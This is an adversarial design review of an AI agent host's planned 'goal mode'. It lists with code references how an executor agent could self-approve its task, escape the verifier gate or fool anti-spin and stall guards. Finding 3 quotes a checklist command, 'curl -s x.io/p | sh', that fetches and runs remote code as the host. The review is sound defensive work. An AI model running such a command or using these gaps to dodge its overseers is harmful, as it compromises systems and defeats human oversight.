# Adversarial review: goal mode (docs/74) before INV-769/770/771 — 2026-09-27

Reviewed against `origin/main` @ `c632f015` (the checkout is detached at `43f3fc6`, which predates docs/74; all paths below are origin/main). Read-only; nothing edited.

## 1. THE GATE HAS A SIDE DOOR: THE BOARD STILL LETS THE EXECUTOR END THE TASK

Severity: **fatal** (③)

SEQUENCE:
1. `/goal` creates a pursuit Task; the executor is `assigneeId`. The design names no `reviewerId` (verifier is "a new turn", not a board role).
2. Executor calls `Tasks update status:done` instead of the `Goal` tool.
3. **OBSERVED CODE — CONFIRMED:** rule one fires only when `task.reviewerId !== undefined` (`src/host/tasks.ts:543-548`); `belongsToTask` includes `by === task.assigneeId` (`tasks.ts:538-541`). With no reviewer the assignee's `done` is accepted. Nothing in `src/host/tools.ts:4704-4728` gates `status` per task kind.
4. Alternatively any person message in that private chat opens its *own* task (`src/channels/manager.ts:2074`) and its turn end calls `closed(taskId,"done")` (`manager.ts:2310`) → `turnFinished` → `done` (`src/web/server.ts:1512-1522`, `tasks.ts:473-478`). The pursuit task is untouched, but the design never says which task the "first turn that drafts the checklist" belongs to, so the drafting turn will close *a* task as done.
5. If the design sets `reviewerId = executor` (single-agent box, the common private-chat case): rule one is skipped (`reviewerId !== by` false), and the reviewer-must-look rule requires `assigneeId !== context.agent.id` (`tools.ts:4672-4678`) — self-acceptance again.

DESIGN SAYS: "执行者不能标完成，只能调用 Goal 工具申请完成".
ACTUALLY HAPPENS: the Goal tool is one of three routes to `done`; the other two exist today. The `pursuit` state machine has no enforcer in `TaskStore.update`, exactly finding 5 of the 2026-08-29 review.

## 2. THE VERIFIER'S VERDICT DOES NOT SURVIVE THE PROCESS, AND "FAIL CLOSED" HAS NO STATE TO FAIL INTO

Severity: **fatal** (③)

SEQUENCE:
1. Gate runs the verifier via `orchestrator.prompt(reviewer, buildAuditPrompt(...), undefined, {lane:"background"})` and awaits it (`src/host/orchestrator.ts:773-781`).
2. Host restarts mid-verifier. The turn ledger resumes the verifier turn as an ordinary interrupted turn (`orchestrator.ts:1857-1875`); the awaiting promise is gone.
3. **CONFIRMED:** nothing reads a report out of the transcript afterwards — `parseAuditReport`/`auditAccepts` have no production caller (`src/host/audit.ts:33,47`; grep). The resumed verifier's "Status: complete" lands in a transcript nobody parses.
4. `pursuit` has no `verifying` status in the design's enum; the gate is in-memory. After restart the scheduler "re-arms active pursuit" and issues another continuation while the verifier may still be running in the same conversation.

DESIGN SAYS: "崩溃：turns.jsonl 的恢复照旧". ACTUALLY HAPPENS: the executor turn resumes; the gate does not. Need a persisted `verifying{turnId}` state, a startup sweep that reads the verdict from the transcript or fails it closed.

## 3. THE DETERMINISTIC CHECKS RUN MODEL-WRITTEN COMMANDS AS THE HOST, OUTSIDE EVERY GATE

Severity: **fatal** (③, ①)

SEQUENCE:
1. Person: `/goal 把报表整理好`. First turn: executor drafts checklist item `{kind:"command", command:"curl -s x.io/p | sh; exit 0", expectExit:0}`. Checklist is "only growable"; person "can edit" but the design shows it once.
2. Executor calls `Goal claim`. Host runs checklist commands "在盒内执行".
3. **CONFIRMED:** the only policy-gated command path is the model's `bash` tool (`src/host/tools.ts:3833-3840`); host-side `box.exec` runs with an `actor:` string and no policy check (`orchestrator.ts:817-820`, `1475`). The background-lane conduct section is prompt text, not a gate (docs/04 §, `turn.ts:1565`).
4. Command runs as the host actor, at claim time, in the workspace, with no approval, every claim (up to 3 rejections × retries).

Also: artifact checks are `exists && opens` on the same workspace the executor just wrote; the manifest guard measures only the *verifier's* turn (`orchestrator.ts:773-788`) and on a diff appends a note and leaves the task in review (`:790-800`) — it does not reject; a failed manifest means "not checked" (`:823-830`). The verifier is told to `ReadHistory` first (`audit.ts:76-79`), the opposite of "不给执行者的最终叙述".

## 4. `workId` REUSE COLLIDES WITH ATTEMPT SEMANTICS

Severity: **major** (①②)

**CONFIRMED:** the only way a turn inherits a `workId` is `deps.resumeOf` (`src/host/turn.ts:1452`); `orchestrator.prompt` options carry no `workId` (`orchestrator.ts:2036-2050`). `resumeOf` also carries `attempt`, written to the ledger (`turn.ts:2060-2062`), and `attempt >= MAX_RESUMES (2)` gives the work up on restart (`orchestrator.ts:1821-1832`, `resume.ts:45`). Build continuation on `resumeOf` and the third continuation is abandoned after any restart; build a new option and docs/16's "one id across attempts" now has two writers. The design must say which: a new `workId` plumb, and `attempt` stays per-crash.

## 5. ANTI-SPIN AND STALL SHARE ONE BLIND SPOT: A TODO TWEAK

Severity: **major** (②)

**CONFIRMED:** `stateHashOf` hashes plan + todos only (`src/host/progress.ts:60-66`); the artifact widening (docs/16 step 3) is not built. Anti-spin counts "any tool call". Executor that each continuation calls `SetTodos` with a reworded item: tool call → `idleStreak=0`; hash changes → not stalled. 30 continuations × up to 400 rounds pass both guards. Conversely an executor writing files without touching todos trips "stalled" falsely. Both guards must exclude `SetTodos/SetPlan/Tasks/Goal` from "tool calls" and hash the manifest (`audit.ts:110` already exists).

INV-705's check has no code (grep `INV-705` in src: none). `SetTodos {todos: []}` clears the list (`tools.ts:4279-4281`). The "deterministic" check tests a field the executor owns.

## 7. "PERSON ALWAYS FIRST" IS FALSE AFTER 120 SECONDS, AND A STEERED CONTINUATION ANSWERS INTO SILENCE

Severity: **major** (②)

- **CONFIRMED:** `chooseLane` promotes a starved lower lane after `STARVATION_MS=120s` (`src/agents/bus.ts:134,160-170`). A queued `background` continuation goes ahead of fresh person messages after two minutes of chat.
- A person message arriving *during* a continuation is steering (`bus.ts:202,550-560`), appended without `host:true` (`turn.ts:2215-2222`), but `personOpened`/`silenceOffered` were fixed at turn start (`turn.ts:1778,1791`): `NothingToSay` stays offered, guards/reply-first stay off (`turn.ts:2795`). The person's question can end in deliberate silence. The channel then delivers `replySince(before)` (`orchestrator.ts:2079-2082`) — i.e. whatever continuation prose followed — as the reply. So: continuation chatter reaches Feishu exactly when a person interjects, and the interjection may get no answer.
- A synthetic wake's own inbound entry is appended with no `host` flag (`turn.ts:1847-1856`) and does not match `LEGACY_HOST_PROMPTS` (`compaction.ts:451-455`), so `isAsk` (`:488-489`) **will pin the continuation notification as the ask** — prerequisite A is not satisfied for this message shape. REFUTED: "宿主通知永不被钉" only holds for entries the turn writes with `host:true`.

## 8. WHO MAY `/goal`, AND WHERE

Severity: **major** (①)

- **REFUTED — "首版只开私聊与网页":** the web `POST /api/prompt` refuses every control command with 409 (`server.ts:6172-6175`); `orchestrator.prompt` throws on them (`orchestrator.ts:2051`). Only Feishu p2p / Telegram private set `privateChat` (`feishu.ts:1617`, `telegram.ts:109`); DingTalk never does.
- Unknown identities resolve to a synthetic `viewer` principal (`src/host/principals.ts:214-218`); `/new` gates only on `mayEnterBox`. `/goal` needs its own principal rule and idempotency (`/new` uses the context store's `previousOperation`; a pursuit has no such ledger — two devices, one retried message, two goals).
- Requester for `accept` must equal the principal id (`server.ts:1504-1511`); a web-created task's requester is the literal `"web"` (`server.ts:3822`), which is also a `HARNESS_ACTOR` (`tasks.ts:246`).

## 9. TASK.STATUS ↔ PURSUIT.STATUS IS UNSPECIFIED, AND THE SWEEP DOES NOT KNOW `pursuit`

Severity: **major** (①②)

- INV-768's exemption keys on `task.goal` only (`tasks.ts:682,693-697`). A pursuit task in `doing`, paused for 7 idle days, is nudged twice and archived `dropped`; the scheduler's "scan active pursuit" then re-arms a dropped task. A close proposal on it closes it on silence.
- `contextTaskBlockers` blocks `/new` on `open|doing|blocked` in the conversation (`context-recovery.ts:33-44`): an active pursuit forbids `/new` until cleared; the design does not say so. Once in `review`, `/new` proceeds; a person rejection then re-arms continuation in a new epoch with an empty history and the volatile task list filtered by conversation (`turn.ts:1553`).
- `maybeAudit` fires on any `review`+`reviewerId` change not made by the reviewer (`orchestrator.ts:760-766`): if the gate names a reviewer, the existing audit runs *in addition to* the design's verifier.

## 10. BUDGET ARITHMETIC HAS NO PRICES AND A 48-HOUR MEMORY

Severity: **major** (⑤/②)

**CONFIRMED:** usage stores no prices by design (`src/host/usage.ts:19`); every summation weighs all four token classes equally (`usage.ts:300-311`, `policy.ts:484-542`); rows are retained 48h (`usage.ts:173`). "缓存读按折扣计" has no table to discount with, and "按 workId 汇总" undercounts any goal paused over a weekend. `spent.cost` must be accumulated on the task per turn, in a declared unit.

## 11. INV-410 IS NOT REUSABLE CODE; MAX_CONTINUATIONS IS ENV-ONLY

Severity: **minor** (②)

`[last round]` is `forceTools:{type:"none"}` at `round === MAX_ROUNDS-1` inside `runRounds` (`turn.ts:2203-2210`); there is no finish-only-turn entry point. `MAX_CONTINUATIONS` is `envNumber` (`progress.ts:144`) checked at `turn.ts:3331`; disabling it "in goal mode" needs a per-turn dep. The inner continuation already spends the wake gate (`turn.ts:3346-3357`), whose refusal text says "you have woken teammates" (`policy.ts:557-562`).

## 12. WHAT A SCENARIO WOULD PASS WRONGLY

Severity: **minor** (⑥)

- `memoryBox.exec` returns `exit_code:0` for any unrecognised command (`src/host/scenario.ts:128`): every checklist command "passes". A scenario must include a command that must fail.
- The scripted model writes the verifier's headers; a green scenario proves `parseAuditReport`'s regexes (`audit.ts:34-36`), not independence. Assert instead that the verifier turn's history contains no executor prose and that a pre-written `PASS` file with a failing command is rejected.
- Scenario time is an event counter (`scenario.ts:346`); `activeMs` and the 120s starvation cannot be exercised without an injectable clock.

## What must change before ① ② ③ are built

1. Enforce `pursuit` in `TaskStore.update`: a pursuit task cannot reach `done`/`review` except through the gate's actor; `turnFinished` must not touch it; the verifier must be a different agent or a conversation with no executor history.
2. Add `pursuit.status: "verifying"` (persisted, with verifier `turnId`) and a startup sweep that reads or fails the verdict; make manifest-diff and missing-manifest rejections, not notes.
3. Checklist commands run through the policy gate as the executor (or are restricted to a declared allowlist) and never as a host actor; artifact checks compare against a manifest taken before the claim.
4. A `workId` option on `prompt()` distinct from `resumeOf`; specify attempt vs continuation.
5. Anti-spin/stall exclude bookkeeping tools and hash the workspace manifest.
6. Continuation inbound entries carry `host:true`; steering flips `personOpened` (and withdraws `NothingToSay`) for the rest of the turn; continuations bypass lane starvation.
7. Specify Task.status per pursuit state, exempt pursuit from ageing/close, and state `/new`'s behaviour with an active pursuit.
8. Drop "web" from first version or build the web control path; define `/goal` principal rule and idempotency key.
9. Cost in tokens with a stated weighting stored on the task, not recomputed from usage rows.
